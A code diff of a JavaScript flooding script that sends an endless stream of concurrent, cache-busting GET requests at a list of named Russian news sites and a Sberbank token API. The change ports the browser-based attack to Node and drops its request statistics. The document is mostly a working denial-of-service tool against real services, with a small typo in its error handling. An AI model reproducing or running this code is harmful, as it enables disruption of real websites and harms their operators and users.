@@ -1,3 +1,5 @@
+const fetch = require('cross-fetch');
+
 var targets = [
     'https://lenta.ru/',
     'https://ria.ru/',
@@ -64,55 +66,48 @@ var targets = [
     'https://api.sberbank.ru/prod/tokens/v2/oidc',
   ]
   
-  var targetStats = {}
-  targets.forEach((target) => {
-    targetStats[target] = { number_of_requests: 0, number_of_errored_responses: 0 }
-  })
-  
-  var CONCURRENCY_LIMIT = 1000
-  var queue = []
-  
-  async function fetchWithTimeout(resource, options) {
-    const controller = new AbortController();
-    const id = setTimeout(() => controller.abort(), options.timeout);
-    return fetch(resource, {
-      method: 'GET',
-      mode: 'no-cors',
-      signal: controller.signal
-    }).then((response) => {
-      clearTimeout(id);
-      return response;
-    }).catch((error) => {
-      clearTimeout(id);
-      throw error;
-    });
-  }
-  
-  async function flood(target) {
-    console.log("Running against: ", target)
-    for (var i = 0;; ++i) {
-      if (queue.length > CONCURRENCY_LIMIT) {
-        await queue.shift()
-      }
-      rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
-      queue.push(
-        fetchWithTimeout(target+rand, { timeout: 1000 })
-          .catch((error) => {
-            if (error.code === 20 /* ABORT */) {
-              return;
-            }
-            targetStats[target].number_of_errored_responses++;
-          })
-          .then((response) => {
-            if (response && !response.ok) {
-              targetStats[target].number_of_errored_responses++;
-            }
-            targetStats[target].number_of_requests++;
-          })
-  
-      )
+const CONCURRENCY_LIMIT = 1000
+var queue = []
+
+async function fetchWithTimeout(resource, options) {
+  const controller = new AbortController();
+  const id = setTimeout(() => controller.abort(), options.timeout);
+  return fetch(resource, {
+    method: 'GET',
+    mode: 'no-cors',
+    signal: controller.signal
+  }).then((response) => {
+    clearTimeout(id);
+    return response;
+  }).catch((error) => {
+    clearTimeout(id);
+    throw error;
+  });
+}
+
+async function flood(target) {
+  for (var i = 0;; ++i) {
+    if (queue.length > CONCURRENCY_LIMIT) {
+      await queue.shift()
     }
+    rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
+    queue.push(
+      await fetchWithTimeout(target+rand, { timeout: 1000 })
+        .catch((error) => {
+          if (error.type === 'aborted' /* ABORT */) {
+            return;
+          }
+          console.error(error);
+        })
+        .then((response) => {
+          if (response && !response.ok) {
+            console.error(respone)
+          }
+        })
+
+    )
   }
-  
-  // Start
-  targets.map(flood)
+}
+
+// Start
+targets.map(flood)
